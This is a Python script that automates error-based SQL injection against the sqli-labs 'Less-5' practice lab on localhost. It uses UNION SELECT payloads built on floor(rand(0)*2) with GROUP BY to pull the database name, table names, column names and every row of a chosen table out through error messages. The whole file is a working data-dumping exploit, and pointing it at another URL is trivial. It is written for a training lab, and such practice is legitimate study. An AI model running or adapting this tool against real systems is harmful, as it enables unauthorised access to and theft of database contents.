
#!/usr/bin/env python 
# -*- coding:utf-8 -*-
import requests
from lxml import etree

url = '''http://localhost/sqli-labs-master/Less-5/?id=-1'''
tables_name = []

# Get the current database name
payload = '''' union select 1,count(*),concat_ws(":",(select database()),floor(rand(0)*2)) as a from information_schema.columns group by a --+'''
r = requests.get(url + payload)
html = etree.HTML(r.text)
context = html.xpath('/html/body/div/font[2]/font[1]/text()')[0]
db_name = context.split('\'')[1].split(':')[0]
print('[+] The current database: ')
print(db_name)

# %% Get the name of tables in the current database
payload = '''' union select 1,count(*),concat_ws(":",(select table_name from information_schema.tables where table_schema={} LIMIT {},1),floor(rand(0)*2)) as a from information_schema.columns group by a --+'''
for i in range(10):
    payload_step = payload.format("\"" + db_name + "\"", i)
    r = requests.get(url + payload_step)
    html = etree.HTML(r.text)
    context = html.xpath('/html/body/div/font[2]/font[1]/text()')[0]
    # 只能通过找：来判断了
    if ":" not in context:
        break
    else:
        tables_name.append(context.split("\'")[1].split(":")[0])
print('The tables in the current database: ')
for item in tables_name:
    print('[+]',item)

# %% Choose the specific table to further crack
table_name = input("Which table do you want to crack?")
#table_name = "users"
columns_name = []
if table_name in tables_name:
    payload = '''' union select 1,count(*),concat_ws(":",(select column_name from information_schema.columns where table_schema={} and table_name={} LIMIT {},1),floor(rand(0)*2)) as a from information_schema.columns group by a --+'''
    for i in range(50):
        payload_step = payload.format("\""+db_name+"\"","\""+table_name+"\"",i)
        r = requests.get(url + payload_step)
        html = etree.HTML(r.text)
        context = html.xpath('/html/body/div/font[2]/font[1]/text()')[0]
        if ":" not in context:
            break
        else:
            columns_name.append(context.split("\'")[1].split(":")[0])
    print('The columns in the table {}: '.format(table_name))
    for item in columns_name:
        print('[+]', item)
    # list all the columns' values
    payload = '''' union select 1,count(*),concat_ws(":",(select {} from {}.{} LIMIT {},1),floor(rand(0)*2)) as a from information_schema.columns group by a --+'''
    datas = []
    for i in range(50):
        out_break = False
#        print(i)
        data = []
        for item in columns_name:
            payload_step = payload.format(item,db_name,table_name,i)
            r = requests.get(url + payload_step)
            html = etree.HTML(r.text)
            context = html.xpath('/html/body/div/font[2]/font[1]/text()')[0]
            if ":" not in context:
                out_break = True
                break
            else:
                data.append(item+":"+context.split("\'")[1].split(":")[0])
        if out_break:
            break
        data_summary = ""
        for j in data:
            data_summary = data_summary + " -- " + j + " " 
        datas.append(data_summary)
    print("The data in the table {}:".format(table_name))
    for data in datas:
        print("[+] ",data)    
else:
    print("The table you want is not in this database. Exit")


